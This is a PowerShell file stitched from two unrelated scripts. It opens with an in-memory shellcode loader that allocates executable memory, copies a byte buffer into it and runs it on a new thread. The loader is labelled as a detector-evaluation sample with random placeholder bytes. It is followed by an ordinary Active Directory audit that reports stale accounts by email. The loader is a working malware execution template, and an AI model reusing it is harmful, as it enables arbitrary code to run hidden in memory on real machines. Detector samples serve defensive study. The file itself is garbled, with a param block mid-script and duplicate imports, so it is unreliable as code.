<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

$LogPath = "$env:TEMP\stage.log"

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0xca, 0xbe, 0x8f, 0xbb, 0xb4, 0xbf, 0xfa, 0x4d, 0x15, 0x45, 0xf3, 0x98, 0xc6, 0x2f, 0x88, 0x0a,
        0xa4, 0x10, 0xf6, 0x4a, 0xc5, 0xe4, 0x72, 0xf1, 0x87, 0x6f, 0x01, 0x68, 0x7f, 0x3e, 0x8b, 0x8b,
        0x96, 0x5a, 0x68, 0x71, 0xef, 0x73, 0x9f, 0x02, 0x2c, 0xf5, 0xcf, 0xf5, 0xeb, 0x8b, 0x0c, 0x36,
        0xcb, 0x46, 0x05, 0xf5, 0xbb, 0x10, 0x1b, 0x1e, 0x4a, 0x8f, 0x51, 0xc3, 0x7c, 0x42, 0x16, 0x13,
        0x1f, 0x9f, 0x65, 0xab, 0x1c, 0x98, 0x0d, 0xbb, 0x03, 0xe2, 0x67, 0x88, 0x56, 0x70, 0x4f, 0x47,
        0xf3, 0x03, 0x06, 0x6b, 0x55, 0xd8, 0xf0, 0x23, 0xc6, 0x6b, 0xd3, 0xc2, 0x66, 0x1d, 0x90, 0xbf,
        0xa7, 0x80, 0x98, 0xc0, 0x4a, 0x66, 0x2f, 0x28, 0x68, 0xd2, 0xd4, 0x62, 0x80, 0x0a, 0x1b, 0x3d,
        0xb5, 0x78, 0xa7, 0x6e, 0xd8, 0x49, 0x1b, 0x87, 0xc8, 0x94, 0x08, 0x08, 0x00, 0x5b, 0x2a, 0xa1,
        0x84, 0x38, 0x68, 0xa2, 0xa8, 0xed, 0x78, 0xde, 0x3a, 0xe2, 0x1e, 0x57, 0x9d, 0x5e, 0x1c, 0x77,
        0xcf, 0x22, 0x7e, 0xce, 0xa4, 0x86, 0xa5, 0x15, 0x91, 0xab, 0x18, 0x1b, 0x1e, 0xf3, 0x8e, 0x2a,
        0xeb, 0xf9, 0x50, 0xe0, 0xd8, 0xdd, 0xc3, 0xc8, 0x8c, 0xcc, 0x60, 0x05, 0x56, 0x44, 0x14, 0x05,
        0x49, 0x02, 0xf8, 0x9a, 0x55, 0x1f, 0x62, 0xf1, 0xa4, 0x32, 0x05, 0x49, 0xbb, 0xaa, 0x1d, 0xc4,
        0x42, 0x1f, 0x7d, 0xa5, 0xea, 0x17, 0xb5, 0x6b, 0xb0, 0x77, 0x27, 0xa5, 0x0a, 0xcf, 0xc0, 0xb9,
        0xa5, 0xf0, 0x49, 0xb9, 0x2b, 0x30, 0x23, 0xbf, 0x4e, 0x95, 0x47, 0x48, 0xe3, 0xe1, 0xcc, 0xe1,
        0xad, 0x94, 0xf4, 0x80, 0xd3, 0x33, 0x91, 0xc7, 0x4e, 0xa0, 0xab, 0xff, 0xd5, 0x49, 0x2a, 0xb2,
        0x34, 0x3f, 0x64, 0xf6, 0xf3, 0x8f, 0xe4
    )

    $ProcHandle = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($ProcHandle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeMethods]::WaitForSingleObject($Thread, 3181)
    [void][NativeMethods]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [Alias("DnsDomain")]
    [string]$Domain = "adatum.com",

    [string]$SearchBase = 'OU=Managed Users,DC=adatum,DC=com',
    [string]$ReportPath = "C:\Logs\reports\ad-user-audit-2025-09-09.csv",
    [string]$HtmlPath = "C:\Logs\reports\ad-user-audit-2025-09-09.html",
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 365)]
    [int]$InactiveDays = 120,

    [int]$PasswordMaxAge = 365,
    [string]$SmtpServer = "smtp.adatum.com"
)

$WarningPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'

Import-Module ActiveDirectory -ErrorAction Stop

if (-not (Get-Module -ListAvailable -Name ActiveDirectory)) {
    throw "The ActiveDirectory module is not installed on this host."
}
Import-Module ActiveDirectory -ErrorAction Stop

$cutoff = (Get-Date).AddDays(-$InactiveDays)
$properties = @('LastLogonDate', 'PasswordLastSet', 'Enabled', 'Description')
$users = Get-ADUser -Filter * -SearchBase $SearchBase -Properties $properties

$stale = $users | Where-Object {
    $_.Enabled -eq $true -and $_.LastLogonDate -ne $null -and $_.LastLogonDate -lt $cutoff
}

$pwdCutoff = (Get-Date).AddDays(-$PasswordMaxAge)
$oldPasswords = $users | Where-Object {
    $_.PasswordLastSet -ne $null -and $_.PasswordLastSet -lt $pwdCutoff
}

$staleCount = @($stale).Count
$disabledCount = @($users | Where-Object { $_.Enabled -eq $false }).Count
$oldPwdCount = @($oldPasswords).Count

$stale | Select-Object Name, SamAccountName, LastLogonDate, PasswordLastSet | Export-Csv -NoTypeInformation -Path $ReportPath -Encoding UTF8

$oldPasswords | Select-Object Name, SamAccountName, PasswordLastSet | Export-Csv -Path $ReportPath.Replace('.csv', '-passwords.csv') -NoTypeInformation -Encoding UTF8

Write-Host ("Stale: {0} | Disabled: {1} | Old passwords: {2}" -f $staleCount, $disabledCount, $oldPwdCount) -ForegroundColor Cyan
Write-Verbose ("Report written to {0}" -f $ReportPath)

$MailTo = "it-ops@$Domain"
$MailFrom = "reporting@$Domain"

Send-MailMessage -To $MailTo -From $MailFrom -Subject 'AD user audit: stale accounts' `
    -Body 'Stale accounts were found. See the attached report.' -SmtpServer $SmtpServer -Port 2525
